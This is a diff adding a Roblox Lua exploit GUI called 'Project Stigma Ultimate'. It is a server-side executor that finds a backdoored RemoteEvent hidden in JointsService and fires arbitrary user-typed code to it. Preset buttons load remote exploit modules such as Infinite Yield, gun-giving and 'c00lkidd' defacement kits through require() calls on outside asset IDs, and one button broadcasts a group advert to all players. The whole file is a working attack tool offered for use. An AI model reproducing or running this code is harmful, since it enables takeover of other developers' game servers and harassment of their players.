@@ -1,0 +1,349 @@
+local STIGMA_V2 = Instance.new("ScreenGui")
+local uspe = Instance.new("Frame")
+local Header = Instance.new("TextLabel")
+local scriptInput = Instance.new("TextBox")
+local Execute = Instance.new("TextButton")
+local Clear = Instance.new("TextButton")
+local Exit = Instance.new("TextButton")
+local extras = Instance.new("TextButton")
+local scr = Instance.new("Frame")
+local gcg = Instance.new("TextButton")
+local ggun = Instance.new("TextButton")
+local iy = Instance.new("TextButton")
+local cmess = Instance.new("TextButton")
+local oneg = Instance.new("TextButton")
+local ImageLabel = Instance.new("ImageLabel")
+local fr6 = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+
+STIGMA_V2.Name = "STIGMA_V2"
+STIGMA_V2.Parent = game.CoreGui
+
+uspe.Name = "uspe"
+uspe.Parent = STIGMA_V2
+uspe.Active = true
+uspe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+uspe.BorderColor3 = Color3.fromRGB(119, 119, 119)
+uspe.Draggable = true
+uspe.Position = UDim2.new(0, 605, 0, 194)
+uspe.Size = UDim2.new(0, 451, 0, 337)
+
+Header.Name = "Header"
+Header.Parent = uspe
+Header.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
+Header.BorderSizePixel = 0
+Header.Position = UDim2.new(0.00148473727, 0, 0.00296735857, 0)
+Header.Size = UDim2.new(0, 430, 0, 17)
+Header.Font = Enum.Font.SourceSans
+Header.Text = "Project Stigma Ultimate"
+Header.TextColor3 = Color3.fromRGB(77, 77, 77)
+Header.TextSize = 20.000
+Header.TextWrapped = true
+Header.TextXAlignment = Enum.TextXAlignment.Left
+
+scriptInput.Name = "scriptInput"
+scriptInput.Parent = uspe
+scriptInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+scriptInput.BorderColor3 = Color3.fromRGB(124, 124, 124)
+scriptInput.Position = UDim2.new(0, 1, 0, 51)
+scriptInput.Size = UDim2.new(0, 401, 0, 284)
+scriptInput.Font = Enum.Font.Code
+scriptInput.MultiLine = true
+scriptInput.Text = ""
+scriptInput.TextSize = 14.000
+scriptInput.TextXAlignment = Enum.TextXAlignment.Left
+scriptInput.TextYAlignment = Enum.TextYAlignment.Top
+
+Execute.Name = "Execute"
+Execute.Parent = uspe
+Execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Execute.BorderColor3 = Color3.fromRGB(124, 124, 124)
+Execute.Position = UDim2.new(0, 402, 0, 51)
+Execute.Size = UDim2.new(0, 49, 0, 164)
+Execute.Font = Enum.Font.Highway
+Execute.Text = "EXE"
+Execute.TextColor3 = Color3.fromRGB(0, 0, 0)
+Execute.TextSize = 17.000
+Execute.TextWrapped = true
+
+Clear.Name = "Clear"
+Clear.Parent = uspe
+Clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Clear.BorderColor3 = Color3.fromRGB(124, 124, 124)
+Clear.Position = UDim2.new(0, 402, 0, 215)
+Clear.Size = UDim2.new(0, 49, 0, 120)
+Clear.Font = Enum.Font.Highway
+Clear.Text = "CLEAR"
+Clear.TextColor3 = Color3.fromRGB(0, 0, 0)
+Clear.TextSize = 17.000
+Clear.TextWrapped = true
+
+Exit.Name = "Exit"
+Exit.Parent = uspe
+Exit.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
+Exit.BorderSizePixel = 0
+Exit.Position = UDim2.new(0, 426, 0, 0)
+Exit.Size = UDim2.new(0, 25, 0, 18)
+Exit.Font = Enum.Font.Highway
+Exit.Text = "x"
+Exit.TextSize = 14.000
+
+extras.Name = "extras"
+extras.Parent = uspe
+extras.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+extras.BorderSizePixel = 0
+extras.Position = UDim2.new(0, 1, 0, 24)
+extras.Size = UDim2.new(0, 74, 0, 16)
+extras.Font = Enum.Font.SourceSans
+extras.Text = "Extras"
+extras.TextSize = 14.000
+extras.TextWrapped = true
+
+scr.Name = "scr"
+scr.Parent = uspe
+scr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+scr.Position = UDim2.new(0.00221729488, 0, 0.118694365, 0)
+scr.Size = UDim2.new(0, 89, 0, 100)
+scr.Visible = false
+
+gcg.Name = "gcg"
+gcg.Parent = scr
+gcg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+gcg.BorderSizePixel = 0
+gcg.Position = UDim2.new(0.0449438207, 0, -0.00999999978, 0)
+gcg.Size = UDim2.new(0, 85, 0, 16)
+gcg.Font = Enum.Font.SourceSans
+gcg.Text = "Game curser gui"
+gcg.TextSize = 14.000
+gcg.TextWrapped = true
+
+ggun.Name = "ggun"
+ggun.Parent = scr
+ggun.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ggun.BorderSizePixel = 0
+ggun.Position = UDim2.new(0, 0, 0, 32)
+ggun.Size = UDim2.new(0, 89, 0, 19)
+ggun.Font = Enum.Font.SourceSans
+ggun.Text = "Give guns"
+ggun.TextSize = 14.000
+ggun.TextWrapped = true
+
+iy.Name = "iy"
+iy.Parent = scr
+iy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+iy.BorderSizePixel = 0
+iy.Position = UDim2.new(0, 3, 0, 16)
+iy.Size = UDim2.new(0, 82, 0, 16)
+iy.Font = Enum.Font.SourceSans
+iy.Text = "Infinite Yield"
+iy.TextSize = 14.000
+iy.TextWrapped = true
+
+cmess.Name = "cmess"
+cmess.Parent = scr
+cmess.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+cmess.BorderSizePixel = 0
+cmess.Position = UDim2.new(0, 0, 0.720253885, 0)
+cmess.Size = UDim2.new(0, 89, 0, 23)
+cmess.Font = Enum.Font.SourceSans
+cmess.Text = "c00l message"
+cmess.TextColor3 = Color3.fromRGB(0, 0, 0)
+cmess.TextSize = 14.000
+
+oneg.Name = "oneg"
+oneg.Parent = scr
+oneg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+oneg.BorderSizePixel = 0
+oneg.Position = UDim2.new(0, 0, 0.500070214, 0)
+oneg.Size = UDim2.new(0, 89, 0, 23)
+oneg.Font = Enum.Font.SourceSans
+oneg.Text = "1x1x1x1 gui"
+oneg.TextColor3 = Color3.fromRGB(0, 0, 0)
+oneg.TextSize = 14.000
+
+ImageLabel.Parent = STIGMA_V2
+ImageLabel.Active = true
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.Position = UDim2.new(-0.127000004, 0, 0.407999992, 0)
+ImageLabel.Size = UDim2.new(0, 90, 0, 90)
+ImageLabel.Image = "rbxassetid://8265774555"
+
+fr6.Name = "fr6"
+fr6.Parent = ImageLabel
+fr6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+fr6.BackgroundTransparency = 1.000
+fr6.Position = UDim2.new(0, 0, -0.633333325, 0)
+fr6.Size = UDim2.new(0, 90, 0, 50)
+fr6.Font = Enum.Font.SourceSansBold
+fr6.Text = "R15 -> R6"
+fr6.TextColor3 = Color3.fromRGB(0, 0, 0)
+fr6.TextScaled = true
+fr6.TextSize = 18.000
+fr6.TextTransparency = 1.000
+fr6.TextWrapped = true
+
+TextLabel.Parent = ImageLabel
+TextLabel.Active = true
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.99999994, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 269, 0, 90)
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.LineHeight = 1.100
+TextLabel.Text = "Project Stigma Ultimate by Unverified                  Run scripts live without filthy modules or converting!                                                              Use the external program to execute scripts.                                                                                                                                                                 Status: Injected"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 15.000
+TextLabel.TextTransparency = 1.000
+TextLabel.TextWrapped = true
+
+-- Scripts:
+
+local function LHXYMJR_fake_script() -- Execute.execrip 
+	local script = Instance.new('Script', Execute)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
+			if v.Name:match("%^\\") then
+				v:FireServer(script.Parent.Parent.scriptInput.Text)
+			end
+		end
+	end)
+end
+coroutine.wrap(LHXYMJR_fake_script)()
+local function HGMSNNV_fake_script() -- Clear.clerscrip 
+	local script = Instance.new('Script', Clear)
+
+	script.Parent.MouseButton1Click:Connect(function(plr)
+		script.Parent.Parent.scriptInput.Text = " "
+	end)
+end
+coroutine.wrap(HGMSNNV_fake_script)()
+local function AKVOU_fake_script() -- Exit.excrip 
+	local script = Instance.new('Script', Exit)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent:Destroy()
+	end)
+end
+coroutine.wrap(AKVOU_fake_script)()
+local function JRLFTZ_fake_script() -- extras.es 
+	local script = Instance.new('LocalScript', extras)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		if script.Parent.Parent.scr.Visible == false then
+			script.Parent.Parent.scr.Visible = true
+		else script.Parent.Parent.scr.Visible = false
+		end
+	end)
+end
+coroutine.wrap(JRLFTZ_fake_script)()
+local function FIEJC_fake_script() -- gcg.gcgs 
+	local script = Instance.new('LocalScript', gcg)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
+			if v.Name:match("%^\\") then
+				v:FireServer([[require(8226150094).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+			end
+		end
+	end)
+end
+coroutine.wrap(FIEJC_fake_script)()
+local function KUKCEIL_fake_script() -- ggun.gguns 
+	local script = Instance.new('LocalScript', ggun)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
+			if v.Name:match("%^\\") then
+				v:FireServer([[require(4207271766).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+			end
+		end
+	end)
+end
+coroutine.wrap(KUKCEIL_fake_script)()
+local function VVWDJ_fake_script() -- iy.iys 
+	local script = Instance.new('LocalScript', iy)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
+			if v.Name:match("%^\\") then
+				v:FireServer([[require(4848156552)("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+			end
+		end
+	end)
+end
+coroutine.wrap(VVWDJ_fake_script)()
+local function UZRASL_fake_script() -- cmess.cmessS 
+	local script = Instance.new('LocalScript', cmess)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
+			if v.Name:match("%^\\") then
+				v:FireServer([[local m = Instance.new("Hint", game.Workspace) m.Text = "team c00lkidd, join today! https://discord.gg/7A5DRmUCnj"]])
+			end
+		end
+	end)
+end
+coroutine.wrap(UZRASL_fake_script)()
+local function ZSLMUUV_fake_script() -- oneg.onegs 
+	local script = Instance.new('LocalScript', oneg)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
+			if v.Name:match("%^\\") then
+				v:FireServer([[require(8515473220).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+			end
+		end
+	end)
+end
+coroutine.wrap(ZSLMUUV_fake_script)()
+local function LMSYE_fake_script() -- fr6.1526 
+	local script = Instance.new('LocalScript', fr6)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
+			if v.Name:match("%^\\") then
+				v:FireServer([[require(3041175937):r6("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+			end
+		end
+	end)
+end
+coroutine.wrap(LMSYE_fake_script)()
+local function WRFUHXB_fake_script() -- STIGMA_V2.IntroTween 
+	local script = Instance.new('LocalScript', STIGMA_V2)
+
+	local img = script.Parent.ImageLabel
+	local TweenService = game:GetService("TweenService")
+	local txt = img.TextLabel
+	local btn = img.fr6
+	wait(1)
+	img:TweenPosition(UDim2.new(0.458, 0, 0.408, 0), "Out", "Linear", 0.4, false)
+	wait(3)
+	img:TweenPosition(UDim2.new(0.01, 0, 0.813, 0), "Out", "Sine", 0.7, false)
+	wait(1)
+	TweenService:Create(txt, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["BackgroundTransparency"] = 0}):Play()
+	TweenService:Create(txt, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["TextTransparency"] = 0}):Play()
+	
+	for i,v in pairs(game.Players:GetPlayers()) do
+		if v.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then -- R6 detection
+			btn.BackgroundTransparency = 1
+			btn.TextTransparency = 1
+		elseif v.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then -- R15 detection
+			TweenService:Create(btn, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["BackgroundTransparency"] = 0}):Play()
+			TweenService:Create(btn, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["TextTransparency"] = 0}):Play()
+		end
+	end
+	wait(2)
+	while wait() do
+	for i,v in pairs(game.Players:GetPlayers()) do
+		if v.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+	btn.Transparency = 1
+	elseif v.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+	btn.Transparency = 0
+	end
+	end
+	end
+end
+coroutine.wrap(WRFUHXB_fake_script)()
